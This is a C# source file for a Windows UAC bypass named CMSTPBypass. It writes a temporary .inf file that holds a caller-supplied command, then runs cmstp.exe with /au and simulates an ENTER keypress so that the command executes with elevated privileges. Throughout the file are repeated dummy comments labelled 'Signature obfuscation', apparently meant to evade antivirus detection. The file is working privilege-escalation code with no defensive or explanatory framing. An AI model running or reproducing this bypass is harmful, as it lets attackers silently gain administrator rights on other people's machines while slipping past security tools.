using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;
        // public static string F = "Signature obfuscation";
public class CMSTPBypass
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
{
        // public static string F = "Signature obfuscation";
    public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";
        // public static string F = "Signature obfuscation";
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
        // public static string F = "Signature obfuscation";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        // public static string F = "Signature obfuscation";
        string TemporaryDir = "C:\\windows\\temp";
        // public static string F = "Signature obfuscation";
        StringBuilder OutputFile = new StringBuilder();
        // public static string F = "Signature obfuscation";
        OutputFile.Append(TemporaryDir);
        // public static string F = "Signature obfuscation";
        OutputFile.Append("\\");
        // public static string F = "Signature obfuscation";
        OutputFile.Append(RandomFileName);
        // public static string F = "Signature obfuscation";
        OutputFile.Append(".inf");
        // public static string F = "Signature obfuscation";
        StringBuilder newInfData = new StringBuilder(InfData);
        // public static string F = "Signature obfuscation";
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
        // public static string F = "Signature obfuscation";
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        // public static string F = "Signature obfuscation";
        return OutputFile.ToString();
        // public static string F = "Signature obfuscation";
    }

    public static bool Execute(string CommandToExecute)
        // public static string F = "Signature obfuscation";
    {
        // public static string F = "Signature obfuscation";
        if(!File.Exists(BinaryPath))
        {
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
            return false;
        // public static string F = "Signature obfuscation";
        }
        StringBuilder InfFile = new StringBuilder();
        // public static string F = "Signature obfuscation";
        InfFile.Append(SetInfFile(CommandToExecute));

        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        // public static string F = "Signature obfuscation";
        startInfo.Arguments = "/au " + InfFile.ToString();
        // public static string F = "Signature obfuscation";
        startInfo.UseShellExecute = false;
        // public static string F = "Signature obfuscation";
        Process.Start(startInfo);
        // public static string F = "Signature obfuscation";

        IntPtr windowHandle = new IntPtr();
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        windowHandle = IntPtr.Zero;
        // public static string F = "Signature obfuscation";
        do {
            windowHandle = SetWindowActive("cmstp");
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        } while (windowHandle == IntPtr.Zero);

        // public static string F = "Signature obfuscation";
        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        return true;
    }
        // public static string F = "Signature obfuscation";

    public static IntPtr SetWindowActive(string ProcessName)
        // public static string F = "Signature obfuscation";
    {
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        Process[] target = Process.GetProcessesByName(ProcessName);
        // public static string F = "Signature obfuscation";
        if(target.Length == 0) return IntPtr.Zero;
        // public static string F = "Signature obfuscation";
        target[0].Refresh();
        // public static string F = "Signature obfuscation";
        IntPtr WindowHandle = new IntPtr();
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        WindowHandle = target[0].MainWindowHandle;
        // public static string F = "Signature obfuscation";
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        // public static string F = "Signature obfuscation";
        SetForegroundWindow(WindowHandle);
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";
        ShowWindow(WindowHandle, 5);
        // public static string F = "Signature obfuscation";
        return WindowHandle;
        // public static string F = "Signature obfuscation";
    }
        // public static string F = "Signature obfuscation";
}
        // public static string F = "Signature obfuscation";
        // public static string F = "Signature obfuscation";